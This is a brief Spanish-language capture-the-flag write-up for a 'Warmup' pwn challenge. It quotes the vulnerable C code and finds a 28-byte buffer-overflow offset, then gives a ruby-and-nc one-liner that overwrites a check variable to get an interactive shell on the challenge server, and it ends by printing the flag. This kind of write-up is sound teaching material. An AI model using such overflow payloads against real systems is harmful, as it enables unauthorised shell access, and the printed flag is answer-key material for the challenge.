# Pwn / Warmup

En el codigo fuente vemos que si sobreescribimos la variable check a  0x54524543 obtendremos una shell interactiva:

``` C
if (check == 0x54524543)
    {
      printf("Yeah!! You win!\n");
      setreuid(geteuid(), geteuid());  
      system("/bin/bash");
```

Por el buffer de 20 bytes y la respuesta que nos da encontramos que el desplazamiento es de 28 bytes y a partir de entonces se comienza a almacenar en check:

``` bash
 ruby -e 'print "A" * 30' | Descargas/Retos/Warmup/reto 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[check] 0x12004141

Clooosse!
```

El reto era sencillo asi que no hice un script en python, con este oneliner de ruby ya obtenia la shell y solo bastaba con hacer 'cat flag.txt':

``` bash
 (ruby -e 'print "A"*28 + "\x43\x45\x52\x54" + "\n"';cat)  | nc warmup.ctf.cert.unlp.edu.ar 35000
```

`flag{W3lc0me_To_M3t4R3d-2024!}`


